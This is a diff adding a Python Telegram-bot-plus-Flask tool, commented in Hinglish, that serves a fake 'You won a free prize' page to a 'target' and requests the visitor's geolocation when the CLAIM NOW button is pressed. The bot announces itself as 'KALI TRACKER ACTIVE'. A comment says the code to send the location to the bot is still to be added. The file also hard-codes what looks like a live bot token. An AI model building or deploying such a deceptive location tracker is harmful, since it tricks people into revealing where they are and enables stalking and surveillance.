@@ -1,0 +1,62 @@
+import telebot
+from flask import Flask, render_template_string
+from threading import Thread
+import os
+
+# --- SETTINGS ---
+# Aapka Telegram Bot Token (Yahan apna token paste karein)
+TOKEN = '7969711130:AAGMn37hl2TvKwsewDnqrFLgkCSYD4XsxmU'
+bot = telebot.TeleBot(TOKEN)
+app = Flask(__name__)
+
+# --- WEB PAGE (Target ke liye) ---
+HTML_PAGE = """
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Claim Reward</title>
+</head>
+<body style="text-align:center; font-family:sans-serif; padding:50px;">
+    <h1>🎁 Congratulations!</h1>
+    <p>You won a free prize. Click the button below to verify and claim.</p>
+    <button onclick="getLoc()" style="padding:15px; background:blue; color:white; border:none; border-radius:10px;">CLAIM NOW</button>
+
+    <script>
+    function getLoc() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(showPosition);
+        } else { 
+            alert("Geolocation is not supported by this browser.");
+        }
+    }
+    function showPosition(position) {
+        alert("Verification successful! Please wait for redirection.");
+        // Yahan se data bot ko bhejne ka code baad mein add karenge
+    }
+    </script>
+</body>
+</html>
+"""
+
+@app.route('/')
+def home():
+    return render_template_string(HTML_PAGE)
+
+@bot.message_handler(commands=['start'])
+def start_cmd(message):
+    # Render aapko ek URL deta hai, wo yahan show hoga
+    bot.reply_to(message, "💀 **KALI TRACKER ACTIVE**\n\nBot Render par chal raha hai!")
+
+def run_web():
+    # Render hamesha port 10000 ya dynamic port mangta hai
+    port = int(os.environ.get("PORT", 10000))
+    app.run(host='0.0.0.0', port=port)
+
+if __name__ == "__main__":
+    # Flask aur Bot dono ko saath chalane ke liye Threading
+    t = Thread(target=run_web)
+    t.start()
+    print("Bot is starting...")
+    bot.infinity_polling()
+    
